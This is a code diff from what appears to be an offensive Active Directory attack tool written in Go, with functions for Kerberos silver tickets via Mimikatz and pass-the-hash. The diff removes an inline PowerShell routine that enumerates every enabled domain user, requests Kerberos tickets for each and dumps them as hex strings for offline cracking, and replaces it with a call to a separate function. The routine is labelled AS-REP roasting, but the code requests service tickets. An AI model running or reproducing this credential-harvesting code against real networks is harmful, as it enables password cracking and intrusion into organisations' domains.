@@ -138,34 +138,8 @@ func kerberosSilverTicket(user, domain, sid, target, rc4Hash string) (string, er
 	return runMimikatz(mimikatzCmd, "")
 }
 
-func kerberosASREPRoast() (string, error) {
-	psCmd := `
-Add-Type -AssemblyName System.IdentityModel;
-$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name;
-$ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Domain);
-$srch = New-Object System.DirectoryServices.AccountManagement.PrincipalSearcher;
-$uq = New-Object System.DirectoryServices.AccountManagement.UserPrincipal($ctx);
-$uq.Enabled = $true;
-$srch.QueryFilter = $uq;
-$results = @();
-foreach($u in $srch.FindAll()) {
-	if(-not $u.UserPrincipalName){continue};
-	try {
-		$ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $u.UserPrincipalName;
-		$bytes = $ticket.GetRequest();
-		$hash = [System.BitConverter]::ToString($bytes) -replace '-','';
-		if($hash -ne $null -and $hash.Length -gt 20) {
-			$results += $u.UserPrincipalName + ':' + $hash;
-		}
-	} catch {}
-}
-Write-Output ($results -join [string]::NewLine());
-`
-	out, err := runShell(psCmd, "powershell.exe")
-	if err != nil {
-		return "", fmt.Errorf("ASREP roast failed: %w\nOutput: %s", err, out)
-	}
-	return out, nil
+func kerberosASREPRoast(args string) (string, error) {
+	return asrepRoast(args)
 }
 
 func kerberosPassTheHash(user, domain, ntlmHash, target string) (string, error) {
